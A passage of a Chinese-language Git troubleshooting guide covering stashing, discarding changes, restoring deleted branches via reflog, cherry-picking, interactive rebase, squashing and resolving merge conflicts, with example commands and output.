<h3 id="我想把未暂存的内容移动到另一个已存在的分支"><a href="#我想把未暂存的内容移动到另一个已存在的分支" class="headerlink" title="我想把未暂存的内容移动到另一个已存在的分支"></a>我想把未暂存的内容移动到另一个已存在的分支</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git stash</span><br><span class="line">$ git checkout my-branch</span><br><span class="line">$ git stash pop</span><br></pre></td></tr></table></figure>
<p><a href="i-want-to-discard-my-local-uncommitted-changes"></a></p>
<h3 id="我想丢弃本地未提交的变化-uncommitted-changes"><a href="#我想丢弃本地未提交的变化-uncommitted-changes" class="headerlink" title="我想丢弃本地未提交的变化(uncommitted changes)"></a>我想丢弃本地未提交的变化(uncommitted changes)</h3><p>如果你只是想重置源(origin)和你本地(local)之间的一些提交(commit)，你可以：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># one commit</span></span><br><span class="line">(my-branch)$ git reset --hard HEAD^</span><br><span class="line"><span class="comment"># two commits</span></span><br><span class="line">(my-branch)$ git reset --hard HEAD^^</span><br><span class="line"><span class="comment"># four commits</span></span><br><span class="line">(my-branch)$ git reset --hard HEAD~4</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">(master)$ git checkout -f</span><br></pre></td></tr></table></figure>
<p>重置某个特殊的文件, 你可以用文件名做为参数:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git reset filename</span><br></pre></td></tr></table></figure>
<p><a href="i-want-to-discard-specific-unstaged-changes"></a></p>
<h3 id="我想丢弃某些未暂存的内容"><a href="#我想丢弃某些未暂存的内容" class="headerlink" title="我想丢弃某些未暂存的内容"></a>我想丢弃某些未暂存的内容</h3><p>如果你想丢弃工作拷贝中的一部分内容，而不是全部。</p>
<p>签出(checkout)不需要的内容，保留需要的。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git checkout -p</span><br><span class="line"><span class="comment"># Answer y to all of the snippets you want to drop</span></span><br></pre></td></tr></table></figure>
<p>另外一个方法是使用 <code>stash</code>， Stash所有要保留下的内容, 重置工作拷贝, 重新应用保留的部分。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git stash -p</span><br><span class="line"><span class="comment"># Select all of the snippets you want to save</span></span><br><span class="line">$ git reset --hard</span><br><span class="line">$ git stash pop</span><br></pre></td></tr></table></figure>
<p>或者, stash 你不需要的部分, 然后stash drop。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git stash -p</span><br><span class="line"><span class="comment"># Select all of the snippets you don't want to save</span></span><br><span class="line">$ git stash drop</span><br></pre></td></tr></table></figure>
<h2 id="分支-Branches"><a href="#分支-Branches" class="headerlink" title="分支(Branches)"></a>分支(Branches)</h2><p><a name="pull-wrong-branch"></a></p>
<h3 id="我从错误的分支拉取了内容，或把内容拉取到了错误的分支"><a href="#我从错误的分支拉取了内容，或把内容拉取到了错误的分支" class="headerlink" title="我从错误的分支拉取了内容，或把内容拉取到了错误的分支"></a>我从错误的分支拉取了内容，或把内容拉取到了错误的分支</h3><p>这是另外一种使用 <code>git reflog</code> 情况，找到在这次错误拉(pull) 之前HEAD的指向。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git reflog</span><br><span class="line">ab7555f HEAD@&#123;0&#125;: pull origin wrong-branch: Fast-forward</span><br><span class="line">c5bc55a HEAD@&#123;1&#125;: checkout: checkout message goes here</span><br></pre></td></tr></table></figure>
<p>重置分支到你所需的提交(desired commit):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git reset --hard c5bc55a</span><br></pre></td></tr></table></figure>
<p>完成。</p>
<p><a href="discard-local-commits"></a></p>
<h3 id="我想扔掉本地的提交-commit-，以便我的分支与远程的保持一致"><a href="#我想扔掉本地的提交-commit-，以便我的分支与远程的保持一致" class="headerlink" title="我想扔掉本地的提交(commit)，以便我的分支与远程的保持一致"></a>我想扔掉本地的提交(commit)，以便我的分支与远程的保持一致</h3><p>先确认你没有推(push)你的内容到远程。</p>
<p><code>git status</code> 会显示你领先(ahead)源(origin)多少个提交:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git status</span><br><span class="line"><span class="comment"># On branch my-branch</span></span><br><span class="line"><span class="comment"># Your branch is ahead of 'origin/my-branch' by 2 commits.</span></span><br><span class="line"><span class="comment">#   (use "git push" to publish your local commits)</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>一种方法是:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git reset --hard origin/my-branch</span><br></pre></td></tr></table></figure>
<p><a name="commit-wrong-branch"></a></p>
<h3 id="我需要提交到一个新分支，但错误的提交到了master"><a href="#我需要提交到一个新分支，但错误的提交到了master" class="headerlink" title="我需要提交到一个新分支，但错误的提交到了master"></a>我需要提交到一个新分支，但错误的提交到了master</h3><p>在master下创建一个新分支，不切换到新分支,仍在master下:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git branch my-branch</span><br></pre></td></tr></table></figure>
<p>把master分支重置到前一个提交:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git reset --hard HEAD^</span><br></pre></td></tr></table></figure>
<p><code>HEAD^</code> 是 <code>HEAD^1</code> 的简写，你可以通过指定要设置的<code>HEAD</code>来进一步重置。</p>
<p>或者, 如果你不想使用 <code>HEAD^</code>, 找到你想重置到的提交(commit)的hash(<code>git log</code> 能够完成)， 然后重置到这个hash。 使用<code>git push</code> 同步内容到远程。</p>
<p>例如, master分支想重置到的提交的hash为<code>a13b85e</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git reset --hard a13b85e</span><br><span class="line">HEAD is now at a13b85e</span><br></pre></td></tr></table></figure>
<p>签出(checkout)刚才新建的分支继续工作:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git checkout my-branch</span><br></pre></td></tr></table></figure>
<p><a name="keep-whole-file"></a></p>
<h3 id="我想保留来自另外一个ref-ish的整个文件"><a href="#我想保留来自另外一个ref-ish的整个文件" class="headerlink" title="我想保留来自另外一个ref-ish的整个文件"></a>我想保留来自另外一个ref-ish的整个文件</h3><p>假设你正在做一个原型方案(原文为working spike (see note)), 有成百的内容，每个都工作得很好。现在, 你提交到了一个分支，保存工作内容:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(solution)$ git add -A &amp;&amp; git commit -m <span class="string">"Adding all changes from this spike into one big commit."</span></span><br></pre></td></tr></table></figure>
<p>当你想要把它放到一个分支里 (可能是<code>feature</code>, 或者 <code>develop</code>), 你关心是保持整个文件的完整，你想要一个大的提交分隔成比较小。</p>
<p>假设你有:</p>
<ul>
<li>分支 <code>solution</code>, 拥有原型方案， 领先 <code>develop</code> 分支。</li>
<li>分支 <code>develop</code>, 在这里你应用原型方案的一些内容。</li>
</ul>
<p>我去可以通过把内容拿到你的分支里，来解决这个问题:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(develop)$ git checkout solution -- file1.txt</span><br></pre></td></tr></table></figure>
<p>这会把这个文件内容从分支 <code>solution</code> 拿到分支 <code>develop</code> 里来:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># On branch develop</span></span><br><span class="line"><span class="comment"># Your branch is up-to-date with 'origin/develop'.</span></span><br><span class="line"><span class="comment"># Changes to be committed:</span></span><br><span class="line"><span class="comment">#  (use "git reset HEAD &lt;file&gt;..." to unstage)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#        modified:   file1.txt</span></span><br></pre></td></tr></table></figure>
<p>然后, 正常提交。</p>
<p>Note: Spike solutions are made to analyze or solve the problem. These solutions are used for estimation and discarded once everyone gets clear visualization of the problem. ~ <a href="https://en.wikipedia.org/wiki/Extreme_programming_practices" target="_blank" rel="noopener">Wikipedia</a>.</p>
<p><a name="cherry-pick"></a></p>
<h3 id="我把几个提交-commit-提交到了同一个分支，而这些提交应该分布在不同的分支里"><a href="#我把几个提交-commit-提交到了同一个分支，而这些提交应该分布在不同的分支里" class="headerlink" title="我把几个提交(commit)提交到了同一个分支，而这些提交应该分布在不同的分支里"></a>我把几个提交(commit)提交到了同一个分支，而这些提交应该分布在不同的分支里</h3><p>假设你有一个<code>master</code>分支， 执行<code>git log</code>, 你看到你做过两次提交:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">commit e3851e817c451cc36f2e6f3049db528415e3c114</span><br><span class="line">Author: Alex Lee &lt;alexlee@example.com&gt;</span><br><span class="line">Date:   Tue Jul 22 15:39:27 2014 -0400</span><br><span class="line"></span><br><span class="line">    Bug <span class="comment">#21 - Added CSRF protection</span></span><br><span class="line"></span><br><span class="line">commit 5ea51731d150f7ddc4a365437931cd8be3bf3131</span><br><span class="line">Author: Alex Lee &lt;alexlee@example.com&gt;</span><br><span class="line">Date:   Tue Jul 22 15:39:12 2014 -0400</span><br><span class="line"></span><br><span class="line">    Bug <span class="comment">#14 - Fixed spacing on title</span></span><br><span class="line"></span><br><span class="line">commit a13b85e984171c6e2a1729bb061994525f626d14</span><br><span class="line">Author: Aki Rose &lt;akirose@example.com&gt;</span><br><span class="line">Date:   Tue Jul 21 01:12:48 2014 -0400</span><br><span class="line"></span><br><span class="line">    First commit</span><br></pre></td></tr></table></figure>
<p>让我们用提交hash(commit hash)标记bug (<code>e3851e8</code> for #21, <code>5ea5173</code> for #14).</p>
<p>首先, 我们把<code>master</code>分支重置到正确的提交(<code>a13b85e</code>):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git reset --hard a13b85e</span><br><span class="line">HEAD is now at a13b85e</span><br></pre></td></tr></table></figure>
<p>现在, 我们对 bug #21 创建一个新的分支:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git checkout -b 21</span><br><span class="line">(21)$</span><br></pre></td></tr></table></figure>
<p>接着, 我们用 <em>cherry-pick</em> 把对bug #21的提交放入当前分支。 这意味着我们将应用(apply)这个提交(commit)，仅仅这一个提交(commit)，直接在HEAD上面。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(21)$ git cherry-pick e3851e8</span><br></pre></td></tr></table></figure>
<p>这时候, 这里可能会产生冲突， 参见<a href="#interactive-rebase">交互式 rebasing 章</a> <a href="#merge-conflict"><strong>冲突节</strong></a> 解决冲突.</p>
<p>再者， 我们为bug #14 创建一个新的分支, 也基于<code>master</code>分支</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(21)$ git checkout master</span><br><span class="line">(master)$ git checkout -b 14</span><br><span class="line">(14)$</span><br></pre></td></tr></table></figure>
<p>最后, 为 bug #14 执行 <code>cherry-pick</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(14)$ git cherry-pick 5ea5173</span><br></pre></td></tr></table></figure>
<p><a name="delete-stale-local-branches"></a></p>
<h3 id="我想删除上游-upstream-分支被删除了的本地分支"><a href="#我想删除上游-upstream-分支被删除了的本地分支" class="headerlink" title="我想删除上游(upstream)分支被删除了的本地分支"></a>我想删除上游(upstream)分支被删除了的本地分支</h3><p>一旦你在github 上面合并(merge)了一个pull request, 你就可以删除你fork里被合并的分支。 如果你不准备继续在这个分支里工作, 删除这个分支的本地拷贝会更干净，使你不会陷入工作分支和一堆陈旧分支的混乱之中。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git fetch -p</span><br></pre></td></tr></table></figure>
<p><a name="restore-a-deleted-branch"></a></p>
<h3 id="我不小心删除了我的分支"><a href="#我不小心删除了我的分支" class="headerlink" title="我不小心删除了我的分支"></a>我不小心删除了我的分支</h3><p>如果你定期推送到远程, 多数情况下应该是安全的，但有些时候还是可能删除了还没有推到远程的分支。 让我们先创建一个分支和一个新的文件:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git checkout -b my-branch</span><br><span class="line">(my-branch)$ git branch</span><br><span class="line">(my-branch)$ touch foo.txt</span><br><span class="line">(my-branch)$ ls</span><br><span class="line">README.md foo.txt</span><br></pre></td></tr></table></figure>
<p>添加文件并做一次提交</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git add .</span><br><span class="line">(my-branch)$ git commit -m <span class="string">'foo.txt added'</span></span><br><span class="line">(my-branch)$ foo.txt added</span><br><span class="line"> 1 files changed, 1 insertions(+)</span><br><span class="line"> create mode 100644 foo.txt</span><br><span class="line">(my-branch)$ git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">commit 4e3cd85a670ced7cc17a2b5d8d3d809ac88d5012</span><br><span class="line">Author: siemiatj &lt;siemiatj@example.com&gt;</span><br><span class="line">Date:   Wed Jul 30 00:34:10 2014 +0200</span><br><span class="line"></span><br><span class="line">    foo.txt added</span><br><span class="line"></span><br><span class="line">commit 69204cdf0acbab201619d95ad8295928e7f411d5</span><br><span class="line">Author: Kate Hudson &lt;katehudson@example.com&gt;</span><br><span class="line">Date:   Tue Jul 29 13:14:46 2014 -0400</span><br><span class="line"></span><br><span class="line">    Fixes <span class="comment">#6: Force pushing after amending commits</span></span><br></pre></td></tr></table></figure>
<p>现在我们切回到主(master)分支，‘不小心的’删除<code>my-branch</code>分支</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git checkout master</span><br><span class="line">Switched to branch <span class="string">'master'</span></span><br><span class="line">Your branch is up-to-date with <span class="string">'origin/master'</span>.</span><br><span class="line">(master)$ git branch -D my-branch</span><br><span class="line">Deleted branch my-branch (was 4e3cd85).</span><br><span class="line">(master)$ <span class="built_in">echo</span> oh noes, deleted my branch!</span><br><span class="line">oh noes, deleted my branch!</span><br></pre></td></tr></table></figure>
<p>在这时候你应该想起了<code>reflog</code>, 一个升级版的日志，它存储了仓库(repo)里面所有动作的历史。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(master)$ git reflog</span><br><span class="line">69204cd HEAD@&#123;0&#125;: checkout: moving from my-branch to master</span><br><span class="line">4e3cd85 HEAD@&#123;1&#125;: commit: foo.txt added</span><br><span class="line">69204cd HEAD@&#123;2&#125;: checkout: moving from master to my-branch</span><br></pre></td></tr></table></figure>
<p>正如你所见，我们有一个来自删除分支的提交hash(commit hash)，接下来看看是否能恢复删除了的分支。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git checkout -b my-branch-help</span><br><span class="line">Switched to a new branch <span class="string">'my-branch-help'</span></span><br><span class="line">(my-branch-help)$ git reset --hard 4e3cd85</span><br><span class="line">HEAD is now at 4e3cd85 foo.txt added</span><br><span class="line">(my-branch-help)$ ls</span><br><span class="line">README.md foo.txt</span><br></pre></td></tr></table></figure>
<p>看! 我们把删除的文件找回来了。 Git的 <code>reflog</code> 在rebasing出错的时候也是同样有用的。</p>
<p><a name="i-want-to-delete-a-branch"></a></p>
<h3 id="我想删除一个分支"><a href="#我想删除一个分支" class="headerlink" title="我想删除一个分支"></a>我想删除一个分支</h3><p>删除一个远程分支:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git push origin --delete my-branch</span><br></pre></td></tr></table></figure>
<p>你也可以:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git push origin :my-branch</span><br></pre></td></tr></table></figure>
<p>删除一个本地分支:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git branch -D my-branch</span><br></pre></td></tr></table></figure>
<p><a name="i-want-to-checkout-to-a-remote-branch-that-someone-else-is-working-on"></a></p>
<h3 id="我想从别人正在工作的远程分支签出-checkout-一个分支"><a href="#我想从别人正在工作的远程分支签出-checkout-一个分支" class="headerlink" title="我想从别人正在工作的远程分支签出(checkout)一个分支"></a>我想从别人正在工作的远程分支签出(checkout)一个分支</h3><p>首先, 从远程拉取(fetch) 所有分支:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git fetch --all</span><br></pre></td></tr></table></figure>
<p>假设你想要从远程的<code>daves</code>分支签出到本地的<code>daves</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git checkout --track origin/daves</span><br><span class="line">Branch daves <span class="built_in">set</span> up to track remote branch daves from origin.</span><br><span class="line">Switched to a new branch <span class="string">'daves'</span></span><br></pre></td></tr></table></figure>
<p>(<code>--track</code> 是 <code>git checkout -b [branch] [remotename]/[branch]</code> 的简写)</p>
<p>这样就得到了一个<code>daves</code>分支的本地拷贝, 任何推过(pushed)的更新，远程都能看到.</p>
<h2 id="Rebasing-和合并-Merging"><a href="#Rebasing-和合并-Merging" class="headerlink" title="Rebasing 和合并(Merging)"></a>Rebasing 和合并(Merging)</h2><p><a name="undo-rebase"></a></p>
<h3 id="我想撤销rebase-merge"><a href="#我想撤销rebase-merge" class="headerlink" title="我想撤销rebase/merge"></a>我想撤销rebase/merge</h3><p>你可以合并(merge)或rebase了一个错误的分支, 或者完成不了一个进行中的rebase/merge。 Git 在进行危险操作的时候会把原始的HEAD保存在一个叫ORIG_HEAD的变量里, 所以要把分支恢复到rebase/merge前的状态是很容易的。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git reset --hard ORIG_HEAD</span><br></pre></td></tr></table></figure>
<p><a name="force-push-rebase"></a></p>
<h3 id="我已经rebase过-但是我不想强推-force-push"><a href="#我已经rebase过-但是我不想强推-force-push" class="headerlink" title="我已经rebase过, 但是我不想强推(force push)"></a>我已经rebase过, 但是我不想强推(force push)</h3><p>不幸的是，如果你想把这些变化(changes)反应到远程分支上，你就必须得强推(force push)。 是因你快进(Fast forward)了提交，改变了Git历史, 远程分支不会接受变化(changes)，除非强推(force push)。这就是许多人使用 merge 工作流, 而不是 rebasing 工作流的主要原因之一， 开发者的强推(force push)会使大的团队陷入麻烦。使用时需要注意，一种安全使用 rebase 的方法是，不要把你的变化(changes)反映到远程分支上, 而是按下面的做:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git checkout my-branch</span><br><span class="line">(my-branch)$ git rebase -i master</span><br><span class="line">(my-branch)$ git checkout master</span><br><span class="line">(master)$ git merge --ff-only my-branch</span><br></pre></td></tr></table></figure>
<p>更多, 参见 <a href="http://stackoverflow.com/questions/11058312/how-can-i-use-git-rebase-without-requiring-a-forced-push" target="_blank" rel="noopener">this SO thread</a>.</p>
<p><a name="interactive-rebase"></a></p>
<h3 id="我需要组合-combine-几个提交-commit"><a href="#我需要组合-combine-几个提交-commit" class="headerlink" title="我需要组合(combine)几个提交(commit)"></a>我需要组合(combine)几个提交(commit)</h3><p>假设你的工作分支将会做对于 <code>master</code> 的pull-request。 一般情况下你不关心提交(commit)的时间戳，只想组合 <em>所有</em> 提交(commit) 到一个单独的里面, 然后重置(reset)重提交(recommit)。 确保主(master)分支是最新的和你的变化都已经提交了, 然后:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git reset --soft master</span><br><span class="line">(my-branch)$ git commit -am <span class="string">"New awesome feature"</span></span><br></pre></td></tr></table></figure>
<p>如果你想要更多的控制, 想要保留时间戳, 你需要做交互式rebase (interactive rebase):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git rebase -i master</span><br></pre></td></tr></table></figure>
<p>如果没有相对的其它分支， 你将不得不相对自己的<code>HEAD</code> 进行 rebase。 例如：你想组合最近的两次提交(commit), 你将相对于<code>HEAD~2</code> 进行rebase， 组合最近3次提交(commit), 相对于<code>HEAD~3</code>, 等等。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git rebase -i HEAD~2</span><br></pre></td></tr></table></figure>
<p>在你执行了交互式 rebase的命令(interactive rebase command)后, 你将在你的编辑器里看到类似下面的内容:</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">pick a9c8a1d Some refactoring</span><br><span class="line">pick <span class="number">01</span>b2fd8 New awesome feature</span><br><span class="line">pick b729ad5 fixup</span><br><span class="line">pick e3851e8 another <span class="keyword">fix</span></span><br><span class="line"></span><br><span class="line"># Rebase <span class="number">8074</span>d12..b729ad5 onto <span class="number">8074</span>d12</span><br><span class="line">#</span><br><span class="line"># Command<span class="variable">s:</span></span><br><span class="line">#  <span class="keyword">p</span>, pick = use commit</span><br><span class="line">#  r, reword = use commit, but <span class="keyword">edit</span> the commit message</span><br><span class="line">#  <span class="keyword">e</span>, <span class="keyword">edit</span> = use commit, but <span class="keyword">stop</span> <span class="keyword">for</span> amending</span><br><span class="line">#  s, squash = use commit, but meld into <span class="keyword">previous</span> commit</span><br><span class="line">#  <span class="keyword">f</span>, fixup = like <span class="string">"squash"</span>, but discard this commit<span class="string">'s log message</span></span><br><span class="line"><span class="string">#  x, exec = run command (the rest of the line) using shell</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># These lines can be re-ordered; they are executed from top to bottom.</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># If you remove a line here THAT COMMIT WILL BE LOST.</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># However, if you remove everything, the rebase will be aborted.</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># Note that empty commits are commented out</span></span><br></pre></td></tr></table></figure>
<p>所有以 <code>#</code> 开头的行都是注释, 不会影响 rebase.</p>
<p>然后，你可以用任何上面命令列表的命令替换 <code>pick</code>, 你也可以通过删除对应的行来删除一个提交(commit)。</p>
<p>例如, 如果你想 <strong>单独保留最旧(first)的提交(commit),组合所有剩下的到第二个里面</strong>, 你就应该编辑第二个提交(commit)后面的每个提交(commit) 前的单词为 <code>f</code>:</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">pick a9c8a1d Some refactoring</span><br><span class="line">pick <span class="number">01</span>b2fd8 New awesome feature</span><br><span class="line"><span class="keyword">f</span> b729ad5 fixup</span><br><span class="line"><span class="keyword">f</span> e3851e8 another <span class="keyword">fix</span></span><br></pre></td></tr></table></figure>
<p>如果你想组合这些提交(commit) <strong>并重命名这个提交(commit)</strong>, 你应该在第二个提交(commit)旁边添加一个<code>r</code>，或者更简单的用<code>s</code> 替代 <code>f</code>:</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">pick a9c8a1d Some refactoring</span><br><span class="line">pick <span class="number">01</span>b2fd8 New awesome feature</span><br><span class="line">s b729ad5 fixup</span><br><span class="line">s e3851e8 another <span class="keyword">fix</span></span><br></pre></td></tr></table></figure>
<p>你可以在接下来弹出的文本提示框里重命名提交(commit)。</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">Newer, awesomer features</span><br><span class="line"></span><br><span class="line"># Please enter the commit message <span class="keyword">for</span> your <span class="keyword">changes</span>. Lines starting</span><br><span class="line"># with <span class="string">'#'</span> will <span class="keyword">be</span> ignored, <span class="built_in">and</span> <span class="keyword">an</span> <span class="built_in">empty</span> message aborts the commit.</span><br><span class="line"># rebase in progress; onto 8074d12</span><br><span class="line"># You are currently editing <span class="keyword">a</span> commit <span class="keyword">while</span> rebasing branch <span class="string">'master'</span> <span class="keyword">on</span> <span class="string">'8074d12'</span>.</span><br><span class="line">#</span><br><span class="line"># Changes <span class="keyword">to</span> <span class="keyword">be</span> committed:</span><br><span class="line">#	modified:   README.md</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
<p>如果成功了, 你应该看到类似下面的内容:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ Successfully rebased and updated refs/heads/master.</span><br></pre></td></tr></table></figure>
<h4 id="安全合并-merging-策略"><a href="#安全合并-merging-策略" class="headerlink" title="安全合并(merging)策略"></a>安全合并(merging)策略</h4><p><code>--no-commit</code> 执行合并(merge)但不自动提交, 给用户在做提交前检查和修改的机会。 <code>no-ff</code> 会为特性分支(feature branch)的存在过留下证据, 保持项目历史一致。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git merge --no-ff --no-commit my-branch</span><br></pre></td></tr></table></figure>
<h4 id="我需要将一个分支合并成一个提交-commit"><a href="#我需要将一个分支合并成一个提交-commit" class="headerlink" title="我需要将一个分支合并成一个提交(commit)"></a>我需要将一个分支合并成一个提交(commit)</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git merge --squash my-branch</span><br></pre></td></tr></table></figure>
<p><a name="rebase-unpushed-commits"></a></p>
<h4 id="我只想组合-combine-未推的提交-unpushed-commit"><a href="#我只想组合-combine-未推的提交-unpushed-commit" class="headerlink" title="我只想组合(combine)未推的提交(unpushed commit)"></a>我只想组合(combine)未推的提交(unpushed commit)</h4><p>有时候，在将数据推向上游之前，你有几个正在进行的工作提交(commit)。这时候不希望把已经推(push)过的组合进来，因为其他人可能已经有提交(commit)引用它们了。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git rebase -i @&#123;u&#125;</span><br></pre></td></tr></table></figure>
<p>这会产生一次交互式的rebase(interactive rebase), 只会列出没有推(push)的提交(commit)， 在这个列表时进行reorder/fix/squash 都是安全的。</p>
<p><a name="check-if-all-commits-on-a-branch-are-merged"></a></p>
<h3 id="检查是否分支上的所有提交-commit-都合并-merge-过了"><a href="#检查是否分支上的所有提交-commit-都合并-merge-过了" class="headerlink" title="检查是否分支上的所有提交(commit)都合并(merge)过了"></a>检查是否分支上的所有提交(commit)都合并(merge)过了</h3><p>检查一个分支上的所有提交(commit)是否都已经合并(merge)到了其它分支, 你应该在这些分支的head(或任何 commits)之间做一次diff:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git <span class="built_in">log</span> --graph --left-right --cherry-pick --oneline HEAD...feature/120-on-scroll</span><br></pre></td></tr></table></figure>
<p>这会告诉你在一个分支里有而另一个分支没有的所有提交(commit), 和分支之间不共享的提交(commit)的列表。 另一个做法可以是:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git <span class="built_in">log</span> master ^feature/120-on-scroll --no-merges</span><br></pre></td></tr></table></figure>
<h3 id="交互式rebase-interactive-rebase-可能出现的问题"><a href="#交互式rebase-interactive-rebase-可能出现的问题" class="headerlink" title="交互式rebase(interactive rebase)可能出现的问题"></a>交互式rebase(interactive rebase)可能出现的问题</h3><p><a name="noop"></a></p>
<h4 id="这个rebase-编辑屏幕出现’noop’"><a href="#这个rebase-编辑屏幕出现’noop’" class="headerlink" title="这个rebase 编辑屏幕出现’noop’"></a>这个rebase 编辑屏幕出现’noop’</h4><p>如果你看到的是这样:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">noop</span><br></pre></td></tr></table></figure></p>
<p>这意味着你rebase的分支和当前分支在同一个提交(commit)上, 或者 <em>领先(ahead)</em> 当前分支。 你可以尝试:</p>
<ul>
<li>检查确保主(master)分支没有问题</li>
<li>rebase  <code>HEAD~2</code> 或者更早</li>
</ul>
<p><a name="merge-conflict"></a></p>
<h4 id="有冲突的情况"><a href="#有冲突的情况" class="headerlink" title="有冲突的情况"></a>有冲突的情况</h4><p>如果你不能成功的完成rebase, 你可能必须要解决冲突。</p>
<p>首先执行 <code>git status</code> 找出哪些文件有冲突:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git status</span><br><span class="line">On branch my-branch</span><br><span class="line">Changes not staged <span class="keyword">for</span> commit:</span><br><span class="line">  (use <span class="string">"git add &lt;file&gt;..."</span> to update what will be committed)</span><br><span class="line">  (use <span class="string">"git checkout -- &lt;file&gt;..."</span> to discard changes <span class="keyword">in</span> working directory)</span><br><span class="line"></span><br><span class="line">	modified:   README.md</span><br></pre></td></tr></table></figure>
<p>在这个例子里面, <code>README.md</code> 有冲突。 打开这个文件找到类似下面的内容:</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">some code</span><br><span class="line">=========</span><br><span class="line">some code</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; <span class="keyword">new</span>-commit</span><br></pre></td></tr></table></figure>
<p>你需要解决新提交的代码(示例里, 从中间<code>==</code>线到<code>new-commit</code>的地方)与<code>HEAD</code> 之间不一样的地方.</p>
<p>有时候这些合并非常复杂，你应该使用可视化的差异编辑器(visual diff editor):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master*)$ git mergetool -t opendiff</span><br></pre></td></tr></table></figure>
<p>在你解决完所有冲突和测试过后, <code>git add</code> 变化了的(changed)文件, 然后用<code>git rebase --continue</code> 继续rebase。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git add README.md</span><br><span class="line">(my-branch)$ git rebase --<span class="built_in">continue</span></span><br></pre></td></tr></table></figure>
<p>如果在解决完所有的冲突过后，得到了与提交前一样的结果, 可以执行<code>git rebase --skip</code>。</p>
<p>任何时候你想结束整个rebase 过程，回来rebase前的分支状态, 你可以做:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(my-branch)$ git rebase --abort</span><br></pre></td></tr></table></figure>
<p><a name="miscellaneous-objects"></a></p>
<h2 id="杂项-Miscellaneous-Objects"><a href="#杂项-Miscellaneous-Objects" class="headerlink" title="杂项(Miscellaneous Objects)"></a>杂项(Miscellaneous Objects)</h2><p><a name="clone-submodules"></a></p>
